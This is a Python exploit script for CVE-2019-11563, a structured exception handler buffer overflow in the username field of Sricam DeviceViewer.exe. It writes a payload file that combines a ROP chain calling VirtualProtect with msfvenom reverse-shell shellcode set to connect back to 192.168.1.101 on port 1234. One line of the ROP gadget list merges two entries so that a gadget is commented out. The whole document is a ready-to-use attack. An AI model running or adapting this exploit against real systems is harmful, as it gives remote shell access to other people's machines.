#!/usr/bin/python

import struct

#------------------------------------------------------------#
# CVE-2019-11563                                             #
#                                                            #
# Sricam DeviceViewer.exe 'username' field SEH overflow      #
# by Hayden Wright                                           #
#                                                            #
# (*) badchars = '\x00\x0a\x0d'                              #
# (*) SEH = 0x6a413969 OFFSET 268                            #
# (*) nSEH = 268 -4                                          #
#                                                            #
#  69901d06  5E  POP ESI                                     #
#  69901d07  5F  POP EDI                                     #
#  69901d08  C3  RETN                                        #
#                                                            #
#------------------------------------------------------------#

#msfvenom -p windows/shell_reverse_tcp lport=1234 lhost=192.168.1.101 -f c -b '\x00\x0a\x0d' -a x86 --platform windows EXITFUNC=seh

shellcode =(
"\xbf\x19\x16\xe7\xae\xda\xd5\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x31\x31\x7a\x13\x83\xea\xfc\x03\x7a\x16\xf4\x12\x52\xc0\x7a"
"\xdc\xab\x10\x1b\x54\x4e\x21\x1b\x02\x1a\x11\xab\x40\x4e\x9d"
"\x40\x04\x7b\x16\x24\x81\x8c\x9f\x83\xf7\xa3\x20\xbf\xc4\xa2"
"\xa2\xc2\x18\x05\x9b\x0c\x6d\x44\xdc\x71\x9c\x14\xb5\xfe\x33"
"\x89\xb2\x4b\x88\x22\x88\x5a\x88\xd7\x58\x5c\xb9\x49\xd3\x07"
"\x19\x6b\x30\x3c\x10\x73\x55\x79\xea\x08\xad\xf5\xed\xd8\xfc"
"\xf6\x42\x25\x31\x05\x9a\x61\xf5\xf6\xe9\x9b\x06\x8a\xe9\x5f"
"\x75\x50\x7f\x44\xdd\x13\x27\xa0\xdc\xf0\xbe\x23\xd2\xbd\xb5"
"\x6c\xf6\x40\x19\x07\x02\xc8\x9c\xc8\x83\x8a\xba\xcc\xc8\x49"
"\xa2\x55\xb4\x3c\xdb\x86\x17\xe0\x79\xcc\xb5\xf5\xf3\x8f\xd3"
"\x08\x81\xb5\x91\x0b\x99\xb5\x85\x63\xa8\x3e\x4a\xf3\x35\x95"
"\x2f\x05\xc7\x24\xa5\x92\x7e\xdd\x84\xfe\x80\x0b\xca\x06\x03"
"\xbe\xb2\xfc\x1b\xcb\xb7\xb9\x9b\x27\xc5\xd2\x49\x48\x7a\xd2"
"\x5b\x2b\x1d\x40\x07\x82\xb8\xe0\xa2\xda")

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
   rop_gadgets = [
    0x6b050b5e,  # POP EAX # RETN [avcodec-52.dll]
    0x68bab1f4,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT avutil-51.dll]
    0x6ae86ce4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [avcodec-52.dll]
    0x6ae8bcd8,  # XCHG EAX,ESI # RETN [avcodec-52.dll]      0x6addee23,  # POP EBP # RETN [avcodec-52.dll]
    0x6ae591bf,  # & push esp # ret  [avcodec-52.dll]
    0x6ad7a1b6,  # POP EAX # RETN [avcodec-52.dll]
    0xa1a50201,  # put delta into eax (-> put 0x00000201 into ebx)
    0x6ade3410,  # ADD EAX,5E5B0000 # POP EDI # POP EBP # RETN [avcodec-52.dll]
    0x41414141,  # Filler (compensate)
    0x41414141,  # Filler (compensate)
    0x6ad5b2b4,  # PUSH EAX # POP EBX # RETN [avcodec-52.dll]
    0x6ad7a1b6,  # POP EAX # RETN [avcodec-52.dll]
    0xffffffd7,  # put delta into eax (-> put 0x00000040 into edx)
    0x6ad62214,  # ADD EAX,69 # RETN [avcodec-52.dll]
    0x699c5fc2,  # XCHG EAX,EDX # RETN [avformat-54.dll]
    0x699cc348,  # POP ECX # RETN [avformat-54.dll]
    0x6b68c1d7,  # &Writable location [avcodec-52.dll]
    0x6aedffdf,  # POP EDI # RETN [avcodec-52.dll]
    0x6991e152,  # RETN (ROP NOP) [avformat-54.dll]
    0x6b05be46,  # POP EAX # RETN [avcodec-52.dll]
    0x90909090,  # nop
    0x699047dc,  # PUSHAD # RETN [avformat-54.dll]
   ]
   return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()


max_size = 4000

buf = 'A'*264
#buf += "\xeb\x06\x90\x90"            #jump short 6-bytes

buf += struct.pack('<I', 0x69901d06) #POP ESI, POP EDI, RET  avformat-54.dll
buf += rop_chain
buf += '\x90' * 16
buf += shellcode
buf += 'C'*(max_size - len(buf))

filename = 'CVE-2019-11563.txt'

file = open(filename , 'w')
file.write(buf)
file.close()
